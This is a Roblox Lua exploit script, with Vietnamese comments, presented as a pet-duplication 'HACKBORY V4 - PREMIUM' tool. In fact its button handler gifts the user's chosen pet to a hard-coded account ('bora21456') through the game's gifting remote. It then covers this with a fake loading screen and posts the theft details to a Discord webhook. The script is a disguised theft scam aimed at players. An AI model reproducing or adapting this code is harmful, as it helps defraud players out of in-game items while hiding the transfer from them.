local function ShowLoading()
    local loadGui = Instance.new("ScreenGui", game.CoreGui)
    local bg = Instance.new("Frame", loadGui)
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
    bg.ZIndex = 10

    local bar = Instance.new("TextLabel", bg)
    bar.Size = UDim2.new(1,0,0,100)
    bar.Position = UDim2.new(0,0,0.5,-50)
    bar.BackgroundTransparency = 1
    bar.TextColor3 = Color3.fromRGB(0,255,0)
    bar.TextSize = 40
    bar.Font = Enum.Font.SourceSansBold
    bar.ZIndex = 11

    for i=0,100 do
        bar.Text = "Loading... " .. i .. "%"
        wait(0.1)
    end

    loadGui:Destroy()
end

-- N√∫t Dupe + g·ª≠i th√¥ng b√°o khi dupe th√†nh c√¥ng
Button.MouseButton1Click:Connect(function()
    local petName = TextBox.Text
    if petName == "" then return end
    
    local recipient = game:GetService("Players"):WaitForChild("bora21456")
    local args = {"GivePet", recipient}
    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))

    ShowLoading()

    -- G·ª≠i Discord th√¥ng b√°o dupe th√†nh c√¥ng
    local successData = {
        ["username"] = "HACKBORY V4 - PREMIUM",
        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/4712/4712109.png",
        ["embeds"] = {{
            ["title"] = "üéâ DUPE PET TH√ÄNH C√îNG!",
            ["description"] = "**Pet:** " .. petName .. "\n**Ng∆∞·ªùi nh·∫≠n:** " .. recipient.Name .. "\n**S·ªë l·∫ßn dupe:** 1",
            ["color"] = tonumber(0x00ff00),
            ["thumbnail"] = {["url"] = avatarUrl},
            ["footer"] = {["text"] = "HACKBORY V4 - PREMIUM | Auto Notify", ["icon_url"] = "https://i.imgur.com/fxY8aXw.gif"}
        }}
    }
    
    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(successData)
        })
    end)
end)

